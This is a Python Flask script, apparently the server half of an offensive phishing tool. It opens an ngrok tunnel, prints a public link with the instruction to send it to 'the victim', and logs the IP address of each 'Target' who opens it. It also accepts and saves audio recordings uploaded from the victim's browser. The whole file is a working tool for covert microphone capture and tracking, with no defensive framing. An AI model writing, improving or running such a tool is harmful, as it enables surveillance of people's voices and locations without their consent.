from flask import Flask, request, send_file
import os
import datetime
import sys
from pyngrok import ngrok
from colorama import init, Fore, Style

init()

logo_lines = [
    "             _             ",
    "            (_)            ",
    " __   _____  _  ___ ___   ",
    " \ \ / / _ \| |/ __/ _ \  ",
    "  \ V / (_) | | (_|  __/  ",
    "   \_/ \___/|_|\___\___|  ",
    "                          ",
]

print("\n")
for line in logo_lines:
    print(f"{Fore.CYAN}{line}{Style.RESET_ALL}")
print("\n")

# --- CONFIG ---
PORT = 5002

# Prompt user for ngrok authtoken
print(f"{Fore.YELLOW}Enter your ngrok authtoken (get it from https://dashboard.ngrok.com/get-started/your-authtoken):{Style.RESET_ALL}")
authtoken = input("Authtoken: ").strip()

if authtoken:
    ngrok.set_auth_token(authtoken)
else:
    print(f"{Fore.RED}No authtoken provided. Dealing with potential errors...{Style.RESET_ALL}")

# --------------

app = Flask(__name__)

# Ensure audio directory exists
AUDIO_DIR = 'audio'
if not os.path.exists(AUDIO_DIR):
    os.makedirs(AUDIO_DIR)

@app.route('/')
def index():
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"--------------------------------------------------")
    print(f"{Fore.GREEN}[+] Target Opened the Link! IP: {ip_addr}{Style.RESET_ALL}")
    print(f"--------------------------------------------------")
    return send_file('voice.html')

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        if 'audio' not in request.files:
            return {"status": "error", "message": "No file part"}, 400
            
        file = request.files['audio']
        if file.filename == '':
            return {"status": "error", "message": "No selected file"}, 400
            
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{AUDIO_DIR}/audio_{timestamp}.wav"
        
        file.save(filename)
            
        print(f"{Fore.GREEN}[+] Audio Capture Saved: {filename}{Style.RESET_ALL}")
        return {"status": "success", "file": filename}, 200
    except Exception as e:
        print(f"Error saving audio: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    print("----------------------------------------------------------------")
    print(f"Starting Voice Server on port {PORT}...")

    # Force kill any previous ngrok sessions
    print(f"{Fore.YELLOW}[*] Cleaning up old ngrok sessions...{Style.RESET_ALL}")
    ngrok.kill()
    
    try:
        # Open a ngrok tunnel to the HTTP server
        public_url = ngrok.connect(PORT).public_url
        print(f" * Public URL: {Fore.GREEN}{public_url}{Style.RESET_ALL}")
        print("   (Send this link to the victim)")
        print("----------------------------------------------------------------")
    except Exception as e:
        print(f"{Fore.RED}Error starting ngrok: {e}{Style.RESET_ALL}")
        print("Make sure you have an internet connection.")

    try:
        app.run(port=PORT, debug=False)
    except KeyboardInterrupt:
        print("Shutting down...")
        ngrok.kill()
        sys.exit(0)
